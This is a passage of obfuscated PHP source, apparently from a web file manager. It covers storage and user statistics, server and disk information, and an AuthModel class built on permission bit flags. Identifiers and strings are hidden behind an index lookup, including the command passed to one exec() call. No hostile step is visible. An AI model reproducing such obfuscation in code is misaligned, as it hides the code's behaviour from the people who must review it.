Model($ıÆ‡ãæ[608])->where($Üâ‚ËøÖ)->count($ıÆ‡ãæ[1775]); $Üâ‚ËøÖ[$ıÆ‡ãæ[243]] = array($ıÆ‡ãæ[419], array($İš÷¦ı, $æø©êÎ·)); $¼ŒŞÜÓ” = Model($ıÆ‡ãæ[608])->where($Üâ‚ËøÖ)->count($ıÆ‡ãæ[1775]); $Üâ‚ËøÖ[$ıÆ‡ãæ[33]] = $ıÆ‡ãæ[1917]; $šĞş÷‹š = Model($ıÆ‡ãæ[1918])->where($Üâ‚ËøÖ)->count($ıÆ‡ãæ[1919]); $¡Øá¢ş = array($ıÆ‡ãæ[294] => $©ÔÒ‹¬Ë, $ıÆ‡ãæ[845] => (int) $ú€ìÆú©, $ıÆ‡ãæ[1904] => (int) $¼ŒŞÜÓ”, $ıÆ‡ãæ[1905] => (int) $šĞş÷‹š); return $this->insert($¡Øá¢ş); } public function _recordStore($Êîİùª = '') { $–ÑæãÊ¨ =& $_SERVER[±³—úê]; $Ò¯ ¡¦ = strtotime(date($–ÑæãÊ¨[1916], strtotime($Êîİùª))); $ˆàÚ·‹Š = array($–ÑæãÊ¨[243] => array($–ÑæãÊ¨[1092], $Ò¯ ¡¦)); $êçû”€¶ = Model($–ÑæãÊ¨[555])->where($ˆàÚ·‹Š)->sum($–ÑæãÊ¨[79]); $ˆàÚ·‹Š[$–ÑæãÊ¨[496]] = 0; $İ‚Áø›” = Model($–ÑæãÊ¨[905])->where($ˆàÚ·‹Š)->sum($–ÑæãÊ¨[79]); $ˆàÚ·‹Š[$–ÑæãÊ¨[190]] = 1; $Š²åÈ«Á = Model($–ÑæãÊ¨[905])->where($ˆàÚ·‹Š)->sum($–ÑæãÊ¨[79]); $ˆàÚ·‹Š[$–ÑæãÊ¨[190]] = 2; $ù¶À¾Á = Model($–ÑæãÊ¨[905])->where($ˆàÚ·‹Š)->sum($–ÑæãÊ¨[79]); $şÔ¾áã = array($–ÑæãÊ¨[294] => $Êîİùª, $–ÑæãÊ¨[843] => (int) $İ‚Áø›”, $–ÑæãÊ¨[1908] => (int) $êçû”€¶, $–ÑæãÊ¨[1909] => (int) $Š²åÈ«Á, $–ÑæãÊ¨[1910] => (int) $ù¶À¾Á); return $this->insert($şÔ¾áã); } public function trend($Ş»ø¥ø¾, $Äôì³©ê) { $¬ÆŸÖ±ş =& $_SERVER[±³—úê]; if (!$this->init($Ş»ø¥ø¾)) { return !1; } $âû¿Òºğ = $this->trendList($Ş»ø¥ø¾); if ($âû¿Òºğ && $Äôì³©ê != $¬ÆŸÖ±ş[1747]) { $—½üå§© = $âû¿Òºğ[0][$¬ÆŸÖ±ş[294]]; $ú½ı›Ñˆ = $this->validDate($Äôì³©ê, $—½üå§©); $¬äÑÀ¾ = array(); $ÈšÍûÈ” = array_to_keyvalue($âû¿Òºğ, $¬ÆŸÖ±ş[294]); foreach ($ú½ı›Ñˆ as $™”ÀÍ®) { if (isset($ÈšÍûÈ”[$™”ÀÍ®])) { $ÙáŒÛÒ = $ÈšÍûÈ”[$™”ÀÍ®]; } else { $ÙáŒÛÒ = end($âû¿Òºğ); $ÙáŒÛÒ[$¬ÆŸÖ±ş[294]] = $™”ÀÍ®; if ($Ş»ø¥ø¾ == $¬ÆŸÖ±ş[676]) { $ÙáŒÛÒ[$¬ÆŸÖ±ş[1904]] = $ÙáŒÛÒ[$¬ÆŸÖ±ş[1905]] = 0; } } $¬äÑÀ¾[] = $ÙáŒÛÒ; } $âû¿Òºğ = $¬äÑÀ¾; } $¤ƒÒ½æÒ = array($¬ÆŸÖ±ş[676] => array($¬ÆŸÖ±ş[845] => LNG($¬ÆŸÖ±ş[1920]), $¬ÆŸÖ±ş[1904] => LNG($¬ÆŸÖ±ş[1921]), $¬ÆŸÖ±ş[1905] => LNG($¬ÆŸÖ±ş[1922])), $¬ÆŸÖ±ş[1906] => array($¬ÆŸÖ±ş[843] => LNG($¬ÆŸÖ±ş[1923]), $¬ÆŸÖ±ş[1908] => LNG($¬ÆŸÖ±ş[1924]), $¬ÆŸÖ±ş[1909] => LNG($¬ÆŸÖ±ş[1925]), $¬ÆŸÖ±ş[1910] => LNG($¬ÆŸÖ±ş[1926]))); $ÑúÉ×Å“ = array($¬ÆŸÖ±ş[676] => $¬ÆŸÖ±ş[1927], $¬ÆŸÖ±ş[1906] => $¬ÆŸÖ±ş[79]); if (empty($âû¿Òºğ)) { $™”ÀÍ® = date($¬ÆŸÖ±ş[1911], strtotime($¬ÆŸÖ±ş[1912])); $›Ğãª„ó = array($¬ÆŸÖ±ş[294] => $™”ÀÍ®); foreach ($¤ƒÒ½æÒ[$Ş»ø¥ø¾] as $ˆÒˆÈ¤¿ => $Û­¤²©µ) { $›Ğãª„ó[$ˆÒˆÈ¤¿] = 0; } $âû¿Òºğ[] = $›Ğãª„ó; } $÷êÓç”ö = array(); foreach ($âû¿Òºğ as $Û­¤²©µ) { if ($Ş»ø¥ø¾ == $¬ÆŸÖ±ş[1906] && $Û­¤²©µ[$¬ÆŸÖ±ş[1908]] > $Û­¤²©µ[$¬ÆŸÖ±ş[843]]) { $Û­¤²©µ[$¬ÆŸÖ±ş[1908]] = $Û­¤²©µ[$¬ÆŸÖ±ş[843]]; } foreach ($¤ƒÒ½æÒ[$Ş»ø¥ø¾] as $ˆÒˆÈ¤¿ => $® ‰ïÊÃ) { $ÙáŒÛÒ = array($¬ÆŸÖ±ş[294] => $Û­¤²©µ[$¬ÆŸÖ±ş[294]], $¬ÆŸÖ±ş[1661] => $® ‰ïÊÃ); $ÙáŒÛÒ[$ÑúÉ×Å“[$Ş»ø¥ø¾]] = isset($Û­¤²©µ[$ˆÒˆÈ¤¿]) ? $Û­¤²©µ[$ˆÒˆÈ¤¿] : 0; $÷êÓç”ö[] = $ÙáŒÛÒ; } } return $÷êÓç”ö; } public function validDate($ûÅàğÖÂ, $½îõ€¯û) { $¬Òµ“Ïä =& $_SERVER[±³—úê]; $ŸøòÑÕÕ = date($¬Òµ“Ïä[1911], strtotime($¬Òµ“Ïä[1912])); $¶ƒ÷ÈØ» = array($ŸøòÑÕÕ); switch ($ûÅàğÖÂ) { case $¬Òµ“Ïä[1754]: $çÛ»¿êì = mktime(0, 0, 0, date($¬Òµ“Ïä[1928]), date($¬Òµ“Ïä[1454]) - date($¬Òµ“Ïä[1545]) + 7 - 7, date($¬Òµ“Ïä[1929])); $ÔÌı¾Š¶ = 0; do { $ª”íü–â = date($¬Òµ“Ïä[1911], $çÛ»¿êì - 3600 * 24 * 7 * $ÔÌı¾Š¶); $¶ƒ÷ÈØ»[] = $ª”íü–â; $ÔÌı¾Š¶++; } while ($½îõ€¯û < $ª”íü–â); break; case $¬Òµ“Ïä[1752]: $ÔÌı¾Š¶ = 1; do { $íĞõÖåÊ = date($¬Òµ“Ïä[1930], strtotime("\55\40{$ÔÌı¾Š¶}\40\x6d\x6f\156\x74\x68\x73")); $¶ƒ÷ÈØ»[] = $íĞõÖåÊ; $ÔÌı¾Š¶++; } while ($½îõ€¯û < $íĞõÖåÊ); break; case $¬Òµ“Ïä[1931]: $ŞƒñÚÛê = (int) date($¬Òµ“Ïä[1929], strtotime($½îõ€¯û)); $‰ø‰Š‡Ö = (int) date($¬Òµ“Ïä[1929]); if ($ŞƒñÚÛê >= $‰ø‰Š‡Ö) { break; } for ($ŞƒñÚÛê; $ŞƒñÚÛê < $‰ø‰Š‡Ö; $ŞƒñÚÛê++) { $¶ƒ÷ÈØ»[] = $ŞƒñÚÛê . $¬Òµ“Ïä[1932]; } break; default: break; } if ($½îõ€¯û > end($¶ƒ÷ÈØ»)) { array_pop($¶ƒ÷ÈØ»); } sort($¶ƒ÷ÈØ»); return $¶ƒ÷ÈØ»; } public function listTable($³€ï¢Ïø) { $’à“àïÀ = ucfirst($³€ï¢Ïø); return Model($’à“àïÀ)->listData(); } public function option($œ°‘©ÂŸ) { $­èÜŒŞ… = $_SERVER[±³—úê][1933] . ucfirst($œ°‘©ÂŸ); return $this->{$­èÜŒŞ…}(); } private function optionUser() { $õƒŞé¯ª =& $_SERVER[±³—úê]; $Àİ°ñ“æ = Model($õƒŞé¯ª[608])->count($õƒŞé¯ª[1775]); $ş¶´í• = Model($õƒŞé¯ª[608])->where($õƒŞé¯ª[1934])->count($õƒŞé¯ª[1775]); $§†ÎÜ©µ = intval($GLOBALS[$õƒŞé¯ª[6]][$õƒŞé¯ª[435]][$õƒŞé¯ª[1720]]) / 3600; $ƒÉ¤É”µ = strtotime("\55{$§†ÎÜ©µ}\x20\150\x6f\165\x72\163"); $¬ÌêÖ¸ô = strtotime(date($õƒŞé¯ª[1915])); if ($ƒÉ¤É”µ < $¬ÌêÖ¸ô) { $ƒÉ¤É”µ = $¬ÌêÖ¸ô; } $Ïû¯Æ = array($õƒŞé¯ª[1935] => array($õƒŞé¯ª[1093], $ƒÉ¤É”µ)); $‡µÜÑı€ = (int) Model($õƒŞé¯ª[608])->where($Ïû¯Æ)->count($õƒŞé¯ª[1775]); if (!$‡µÜÑı€) { $‡µÜÑı€ = 1; } $Ïû¯Æ = array($õƒŞé¯ª[1935] => array($õƒŞé¯ª[1093], $¬ÌêÖ¸ô)); $ùš™×ôİ = Model($õƒŞé¯ª[608])->where($Ïû¯Æ)->count($õƒŞé¯ª[1775]); return array($õƒŞé¯ª[838] => (int) $Àİ°ñ“æ, $õƒŞé¯ª[1936] => (int) ($Àİ°ñ“æ - $ş¶´í•), $õƒŞé¯ª[1937] => (int) $ş¶´í•, $õƒŞé¯ª[1938] => (int) $ùš™×ôİ, $õƒŞé¯ª[1939] => $‡µÜÑı€); } private function optionFile() { $ééğèÁ† =& $_SERVER[±³—úê]; $õŞåı = $this->sourceSize(); $Ï±†Æ”® = $õŞåı[$ééğèÁ†[79]]; $Îù¬¶ŠÙ = $õŞåı[$ééğèÁ†[1908]]; $ââù“è» = Model($ééğèÁ†[905])->where(array($ééğèÁ†[496] => 0))->count($ééğèÁ†[193]); $¬†¼Ğ°Ş = array($ééğèÁ†[496] => 0, $ééğèÁ†[243] => array($ééğèÁ†[1093], strtotime(date($ééğèÁ†[1915])))); $£ÓğİÜá = Model($ééğèÁ†[905])->where($¬†¼Ğ°Ş)->sum($ééğèÁ†[79]); $¥ÃÂñÂ‹ = Model($ééğèÁ†[905])->where($¬†¼Ğ°Ş)->count($ééğèÁ†[193]); return array($ééğèÁ†[843] => $Ï±†Æ”®, $ééğèÁ†[1908] => $Îù¬¶ŠÙ, $ééğèÁ†[1940] => $Ï±†Æ”® - $Îù¬¶ŠÙ, $ééğèÁ†[1941] => (int) $£ÓğİÜá, $ééğèÁ†[845] => (int) $ââù“è», $ééğèÁ†[1942] => (int) $¥ÃÂñÂ‹); } private function optionAccess() { $ÀÕú€ô =& $_SERVER[±³—úê]; return array($ÀÕú€ô[838] => $this->typeLogCnt(), $ÀÕú€ô[110] => $this->typeLogCnt($ÀÕú€ô[110]), $ÀÕú€ô[536] => $this->typeLogCnt($ÀÕú€ô[536]), $ÀÕú€ô[1943] => $this->typeLogCnt($ÀÕú€ô[1943]), $ÀÕú€ô[1944] => $this->typeLogCnt($ÀÕú€ô[1944]), $ÀÕú€ô[676] => $this->typeLogCnt($ÀÕú€ô[12], $ÀÕú€ô[1919])); } private function typeLogCnt($¿Á´ùµ = '', $çØÔ“ŞË = "\x69\144") { $¼¼İ¤õô =& $_SERVER[±³—úê]; $Ìıä•á = array($¼¼İ¤õô[110] => array($¼¼İ¤õô[1945], $¼¼İ¤õô[1946]), $¼¼İ¤õô[536] => array($¼¼İ¤õô[1947], $¼¼İ¤õô[1948]), $¼¼İ¤õô[1943] => array($¼¼İ¤õô[1949], $¼¼İ¤õô[1950], $¼¼İ¤õô[1951]), $¼¼İ¤õô[1944] => array($¼¼İ¤õô[1952], $¼¼İ¤õô[1953]), $¼¼İ¤õô[1954] => array($¼¼İ¤õô[1955], $¼¼İ¤õô[1956], $¼¼İ¤õô[1957])); $º¨óˆ¿‚ = strtotime(date($¼¼İ¤õô[1915])); $’ùäí¶Ÿ = array($¼¼İ¤õô[243] => array($¼¼İ¤õô[1093], $º¨óˆ¿‚)); if ($¿Á´ùµ) { $’ùäí¶Ÿ[$¼¼İ¤õô[33]] = array($¼¼İ¤õô[7], $Ìıä•á[$¿Á´ùµ]); } $¿ÔÚ°„ = Model($¼¼İ¤õô[1918])->where($’ùäí¶Ÿ)->count($çØÔ“ŞË); return (int) $¿ÔÚ°„; } private function optionServer() { $Á¶ĞÅäÉ =& $_SERVER[±³—úê]; $àêˆóğ = $this->diskDriver(); $åßšõ¯º = KodIO::defaultDriver(); $–óÈ‡Ò° = array($Á¶ĞÅäÉ[898] => $åßšõ¯º[$Á¶ĞÅäÉ[486]]); $›º©Šåş = Model($Á¶ĞÅäÉ[555])->where($–óÈ‡Ò°)->sum($Á¶ĞÅäÉ[79]); $Ì…äîÏÑ = explode($Á¶ĞÅäÉ[53], $_SERVER[$Á¶ĞÅäÉ[147]]); $¥í·ã = $Ì…äîÏÑ[0]; $™ó‚æäÓ = $GLOBALS[$Á¶ĞÅäÉ[6]][$Á¶ĞÅäÉ[21]]; $ƒÍà«¬— = $™ó‚æäÓ[$Á¶ĞÅäÉ[1055]]; if ($ƒÍà«¬— == $Á¶ĞÅäÉ[1043]) { $˜·ïŠ¸Š = explode($Á¶ĞÅäÉ[1370], $™ó‚æäÓ[$Á¶ĞÅäÉ[1054]]); $ƒÍà«¬— = $˜·ïŠ¸Š[0]; } if ($ƒÍà«¬— == $Á¶ĞÅäÉ[991] || $ƒÍà«¬— == $Á¶ĞÅäÉ[885]) { $İÜËÂ… = Model()->db()->query($Á¶ĞÅäÉ[1958]); $Ú³·Ô˜‰ = $İÜËÂ…[0] && isset($İÜËÂ…[0][$Á¶ĞÅäÉ[1660]]) ? $İÜËÂ…[0][$Á¶ĞÅäÉ[1660]] : 0; $ƒÍà«¬— = $Á¶ĞÅäÉ[1959] . ($Ú³·Ô˜‰ ? $Á¶ĞÅäÉ[8] . $Ú³·Ô˜‰ : $Á¶ĞÅäÉ[12]); } $óÄşÍ¸î = $GLOBALS[$Á¶ĞÅäÉ[6]][$Á¶ĞÅäÉ[435]][$Á¶ĞÅäÉ[907]]; return array($Á¶ĞÅäÉ[1960] => $àêˆóğ ? $àêˆóğ[$Á¶ĞÅäÉ[1961]] : 0, $Á¶ĞÅäÉ[1962] => $àêˆóğ ? $àêˆóğ[$Á¶ĞÅäÉ[1963]] : 0, $Á¶ĞÅäÉ[1964] => (int) $åßšõ¯º[$Á¶ĞÅäÉ[1961]] * 1024 * 1024 * 1024, $Á¶ĞÅäÉ[1965] => (int) $›º©Šåş, $Á¶ĞÅäÉ[1966] => ucfirst($¥í·ã), $Á¶ĞÅäÉ[1967] => $Á¶ĞÅäÉ[1968] . PHP_VERSION, $Á¶ĞÅäÉ[1969] => phpBuild64() ? 64 : 32, $Á¶ĞÅäÉ[837] => str_replace($Á¶ĞÅäÉ[1211], $Á¶ĞÅäÉ[1071], $ƒÍà«¬—), $Á¶ĞÅäÉ[435] => ucfirst($óÄşÍ¸î), $Á¶ĞÅäÉ[32] => $_SERVER[$Á¶ĞÅäÉ[1970]]); } private function diskDriver() { $Íó›ƒÑ¬ =& $_SERVER[±³—úê]; $“Â•Üñâ = $Íó›ƒÑ¬[8]; $½©Æ ˜ƒ = $GLOBALS[$Íó›ƒÑ¬[6]][$Íó›ƒÑ¬[1387]] == $Íó›ƒÑ¬[1388]; if ($½©Æ ˜ƒ) { $“Â•Üñâ = $Íó›ƒÑ¬[1971]; if (function_exists($Íó›ƒÑ¬[1972])) { exec($Íó›ƒÑ¬[1973], $›¾ƒóï÷); $“Â•Üñâ = $›¾ƒóï÷[1] . $Íó›ƒÑ¬[8]; } } if (!file_exists($“Â•Üñâ)) { return; } if (!function_exists($Íó›ƒÑ¬[1974])) { return; } $ëùÉİÑœ = @disk_total_space($“Â•Üñâ); $£øÁ û = $ëùÉİÑœ - @disk_free_space($“Â•Üñâ); return array($Íó›ƒÑ¬[1961] => $ëùÉİÑœ, $Íó›ƒÑ¬[1963] => $£øÁ û); } public function fileChart($×í²”ı©) { $Ù„ÒÕŒ =& $_SERVER[±³—úê]; if (isset($×í²”ı©[$Ù„ÒÕŒ[1775]])) { return Model($Ù„ÒÕŒ[905])->userFileTypeProfile($×í²”ı©[$Ù„ÒÕŒ[1775]]); } if (isset($×í²”ı©[$Ù„ÒÕŒ[1975]])) { return Model($Ù„ÒÕŒ[905])->groupFileTypeProfile($×í²”ı©[$Ù„ÒÕŒ[1975]]); } $ù›òŞ›û = $this->sourceSize(); $‡Â¨äõ = array($Ù„ÒÕŒ[192] => 0, $Ù„ÒÕŒ[190] => 1); $äÊıÂÇ” = Model($Ù„ÒÕŒ[905])->where($‡Â¨äõ)->sum($Ù„ÒÕŒ[79]); $‡Â¨äõ[$Ù„ÒÕŒ[190]] = 2; $ªªà = Model($Ù„ÒÕŒ[905])->where($‡Â¨äõ)->sum($Ù„ÒÕŒ[79]); return array($Ù„ÒÕŒ[843] => $ù›òŞ›û[$Ù„ÒÕŒ[79]], $Ù„ÒÕŒ[1908] => $ù›òŞ›û[$Ù„ÒÕŒ[1908]], $Ù„ÒÕŒ[1909] => (int) $äÊıÂÇ”, $Ù„ÒÕŒ[1910] => (int) $ªªà); } private function sourceSize() { $š±è‘×¡ =& $_SERVER[±³—úê]; $‘‚æÈÏ¹ = Model($š±è‘×¡[905])->where(array($š±è‘×¡[496] => 0))->sum($š±è‘×¡[79]); $‘¶ıƒâ¢ = Model($š±è‘×¡[555])->sum($š±è‘×¡[79]); if ($‘¶ıƒâ¢ > $‘‚æÈÏ¹) { $‘¶ıƒâ¢ = $‘‚æÈÏ¹; } return array($š±è‘×¡[79] => (int) $‘‚æÈÏ¹, $š±è‘×¡[1908] => (int) $‘¶ıƒâ¢); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $¦ãÜêèŞ =& $_SERVER[±³—úê]; $§Ÿ¤âÉ¹ = array(array($¦ãÜêèŞ[505] => LNG($¦ãÜêèŞ[1976]), $¦ãÜêèŞ[1977] => $¦ãÜêèŞ[1978], $¦ãÜêèŞ[1979] => 1, $¦ãÜêèŞ[1980] => 1, $¦ãÜêèŞ[1981] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($¦ãÜêèŞ[505] => LNG($¦ãÜêèŞ[1982]), $¦ãÜêèŞ[1977] => $¦ãÜêèŞ[1983], $¦ãÜêèŞ[1979] => 2, $¦ãÜêèŞ[1980] => 1, $¦ãÜêèŞ[1981] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($¦ãÜêèŞ[505] => LNG($¦ãÜêèŞ[1984]), $¦ãÜêèŞ[1977] => $¦ãÜêèŞ[1985], $¦ãÜêèŞ[1979] => 3, $¦ãÜêèŞ[1980] => 1, $¦ãÜêèŞ[1981] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($¦ãÜêèŞ[505] => LNG($¦ãÜêèŞ[1986]), $¦ãÜêèŞ[1977] => $¦ãÜêèŞ[1987], $¦ãÜêèŞ[1979] => 4, $¦ãÜêèŞ[1980] => 1, $¦ãÜêèŞ[1981] => self::AUTH_SHOW | self::AUTH_VIEW), array($¦ãÜêèŞ[505] => LNG($¦ãÜêèŞ[1988]), $¦ãÜêèŞ[1977] => $¦ãÜêèŞ[1989], $¦ãÜêèŞ[1979] => 5, $¦ãÜêèŞ[1980] => 1, $¦ãÜêèŞ[1981] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($¦ãÜêèŞ[505] => LNG($¦ãÜêèŞ[1990]), $¦ãÜêèŞ[1977] => $¦ãÜêèŞ[1991], $¦ãÜêèŞ[1979] => 6, $¦ãÜêèŞ[1980] => 1, $¦ãÜêèŞ[1981] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($¦ãÜêèŞ[505] => LNG($¦ãÜêèŞ[1992]), $¦ãÜêèŞ[1977] => $¦ãÜêèŞ[1993], $¦ãÜêèŞ[1979] => 7, $¦ãÜêèŞ[1980] => 1, $¦ãÜêèŞ[1981] => 0)); return $§Ÿ¤âÉ¹; } public static function authCheck($ıÂì­˜æ, $¶†ŒÊ±Ä) { $¯Å¾¡İç =& $_SERVER[±³—úê]; $ıÂì­˜æ = intval($ıÂì­˜æ); if (KodUser::isRoot() && $GLOBALS[$¯Å¾¡İç[6]][$¯Å¾¡İç[1994]]) { return !0; } if ($ıÂì­˜æ <= 0) { return !1; } if (($ıÂì­˜æ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ıÂì­˜æ & $¶†ŒÊ±Ä); } public static function authCheckShow($¦Ì‡©‡µ) { return self::authCheck($¦Ì‡©‡µ, self::AUTH_SHOW); } public static function authCheckView($¥‡´Œ˜Ø) { return self::authCheck($¥‡´Œ˜Ø, self::AUTH_VIEW); } public static function authCheckDownload($ºÉÏÄ­ã) { return self::authCheck($ºÉÏÄ­ã, self::AUTH_DOWNLOAD); } public static function authCheckUpload($ğÌãóñß) { return self::authCheck($ğÌãóñß, self::AUTH_UPLOAD); } public static function authCheckEdit($°õË˜Îæ) { return self::authCheck($°õË˜Îæ, self::AUTH_EDIT); } public static function authCheckRemove($‡ô«×İÃ) { return self::authCheck($‡ô«×İÃ, self::AUTH_REMOVE); } public static function authCheckShare($æÅµö»Ø) { return self::authCheck($æÅµö»Ø, self::AUTH_SHARE); } public static function authCheckComment($Ë¦¶¼±ı) { return self::authCheck($Ë¦¶¼±ı, self::AUTH_COMMENT); } public static function authCheckEvent($¦ê˜ŒÎ) { return self::authCheck($¦ê˜ŒÎ, self::AUTH_EVENT); } public static function authCheckRoot($‰¬óòõ) { return self::authCheck($‰¬óòõ, self::AUTH_ROOT); } public static function authCheckAction($¦¢†©ğ, $Ñëö„Ø) { $¿º©£Äİ =& $_SERVER[±³—úê]; $Ô¯Ş™şá = array($¿º©£Äİ[1995] => self::AUTH_VIEW, $¿º©£Äİ[1281] => self::AUTH_DOWNLOAD, $¿º©£Äİ[110] => self::AUTH_UPLOAD, $¿º©£Äİ[1944] => self::AUTH_EDIT, $¿º©£Äİ[1943] => self::AUTH_REMOVE, $¿º©£Äİ[1954] => self::AUTH_SHARE, $¿º©£Äİ[440] => self::AUTH_COMMENT, $¿º©£Äİ[1762] => self::AUTH_EVENT, $¿º©£Äİ[1996] => self::AUTH_ROOT); if (!isset($Ô¯Ş™şá[$Ñëö„Ø])) { return; } $· ãôÄë = $Ô¯Ş™şá[$Ñëö„Ø]; $¦¢†©ğ = intval($¦¢†©ğ); if ($¦¢†©ğ <= 0) { return !1; } if (($¦¢†©ğ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($¦¢†©ğ & $· ãôÄë); } public static function authDisable($ñ£åí˜á, $§§ü·ŠÍ) { if (intval($ñ£åí˜á) <= 0) { return 0; } return intval($ñ£åí˜á) & ~$§§ü·ŠÍ; } public $optionType = "\123\171\x73\x74\145\x6d\56\163\x6f\x75\x72\143\x65\x41\x75\x74\x68\x4c\x69\x73\164"; public $field = array("\x6e\141\155\145", "\x61\x75\x74\x68", "\154\141\x62\145\x6c", "\x64\151\163\x70\154\x61\x79", "\x73\x79\x73\x74\x65\x6d", "\x73\x6f\x72\164"); public function initData() { $‘¹¹¥ñ¡ = $this->authDefault(); foreach ($‘¹¹¥ñ¡ as $¯ğ¹Ñ¤ƒ) { $this->add($¯ğ¹Ñ¤ƒ); } } public function findAuth($×óÔÓóè, $Ê»•Œò¨) { $§ûÊ°“Ó =& $_SERVER[±³—úê]; $¶âŸ·ûÔ = parent::listData(); foreach ($¶âŸ·ûÔ as $Ùú›Şû©) { $Ğóœ¦óÆ = intval($Ùú›Şû©[$§ûÊ°“Ó[498]]); if ($Ğóœ¦óÆ <= 0 || $Ùú›Şû©[$§ûÊ°“Ó[1997]] == 0) { continue; } if (($Ğóœ¦óÆ & $×óÔÓóè) != $×óÔÓóè) { continue; } if (($Ğóœ¦óÆ & $Ê»•Œò¨) != 0) { continue; } return $Ùú›Şû©[$§ûÊ°“Ó[486]]; } return !1; } public function findAuthMax($‡ú ¹ïÜ, $Â–ü˜åí) { $îŸ„Û´½ =& $_SERVER[±³—úê]; $—ÉÊÌÍ¾ = !1; $ƒŠÉåª = parent::listData(); foreach ($ƒŠÉåª as $ÇÑËßéİ) { $´äŠìë¶ = intval($ÇÑËßéİ[$îŸ„Û´½[498]]); if ($´äŠìë¶ <= 0 || $ÇÑËßéİ[$îŸ„Û´½[1997]] == 0) { continue; } if (($´äŠìë¶ & $‡ú ¹ïÜ) != $‡ú ¹ïÜ) { continue; } if (($´äŠìë¶ & $Â–ü˜åí) != 0) { continue; } if (!$—ÉÊÌÍ¾) { $—ÉÊÌÍ¾ = $ÇÑËßéİ; continue; } if (intval($—ÉÊÌÍ¾[$îŸ„Û´½[498]]) < $´äŠìë¶) { $—ÉÊÌÍ¾ = $ÇÑËßéİ; } } return $—ÉÊÌÍ¾ ? $—ÉÊÌÍ¾[$îŸ„Û´½[486]] : !1; } public function findAuthReadOnly() { $Üâø˜Üö = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $ªŠËòƒ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($Üâø˜Üö, $ªŠËòƒ); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $Ï ‡©¶• =& $_SERVER[±³—úê]; $³ùİ¹Ü = parent::listData(); $‡ğ„ŸÉª = !1; foreach ($³ùİ¹Ü as $õ¶Ö´µÔ) { if ($õ¶Ö´µÔ[$Ï ‡©¶•[498]] <= 0 || $õ¶Ö´µÔ[$Ï ‡©¶•[1997]] == $Ï ‡©¶•[240]) { continue; } if (!$‡ğ„ŸÉª) { $‡ğ„ŸÉª = $õ¶Ö´µÔ; continue; } if ($‡ğ„ŸÉª[$Ï ‡©¶•[498]] > $õ¶Ö´µÔ[$Ï ‡©¶•[498]]) { $‡ğ„ŸÉª = $õ¶Ö´µÔ; } } return $‡ğ„ŸÉª ? $‡ğ„ŸÉª[$Ï ‡©¶•[486]] : $Ï ‡©¶•[12]; } public function listData($’†Ëî³‰ = false, $ïûòÕÚ¤ = "\x73\157\162\x74", $›‘İ‘ğ« = false) { return parent::listData($’†Ëî³‰, $ïûòÕÚ¤, $›‘İ‘ğ«); } public function update($´­ÉÇõ, $»ÂÈŠ‹ª) { $êËŸ˜›‡ =& $_SERVER[±³—úê]; $ùõ‰µ¶ = parent::listData($´­ÉÇõ); $»ó „±ó = $this->findByName($»ÂÈŠ‹ª[$êËŸ˜›‡[32]]); if (!$ùõ‰µ¶ || $»ó „±ó && $»ó „±ó[$êËŸ˜›‡[486]] != $ùõ‰µ¶[$êËŸ˜›‡[486]]) { return !1; } $this->filterAuth($»ÂÈŠ‹ª[$êËŸ˜›‡[498]]); return parent::update($´­ÉÇõ, $»ÂÈŠ‹ª); } public function remove($¨ÌÕ®Óí) { $èÙèø¶÷ = parent::listData($¨ÌÕ®Óí); if (!$èÙèø¶÷ || $èÙèø¶÷[$_SERVER[±³—úê][191]]) { return !1; } return parent::remove($¨ÌÕ®Óí); } public function add($’Ó€—Á… = array()) { $ë‰€ËÖ =& $_SERVER[±³—úê]; if ($this->findByName($’Ó€—Á…[$ë‰€ËÖ[32]])) { return !1; } $œ§‘¬ö = array($ë‰€ËÖ[32] => $ë‰€ËÖ[12], $ë‰€ËÖ[498] => 1, $ë‰€ËÖ[1998] => $ë‰€ËÖ[1985], $ë‰€ËÖ[1997] => 1, $ë‰€ËÖ[191] => 0, $ë‰€ËÖ[1999] => 0); $’Ó€—Á… = array_merge($œ§‘¬ö, $’Ó€—Á…); $’Ó€—Á…[$ë‰€ËÖ[1999]] = $this->getSort(); $this->filterAuth($’Ó€—Á…[$ë‰€ËÖ[498]]); return parent::insert($’Ó€—Á…); } private function getSort() { $ôõÒö¬ó =& $_SERVER[±³—úê]; $ËÑÛÚğÑ = parent::listData(); $íıµìê = array_to_keyvalue($ËÑÛÚğÑ, $ôõÒö¬ó[12], $ôõÒö¬ó[1999]); return empty($íıµìê) ? 0 : max($íıµìê) + 1; } private function filterAuth(&$ßÃÒ°Şè) { if (!$ßÃÒ°Şè) { return; } $½¹­š× = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $Œåòï ¿ = array(); foreach 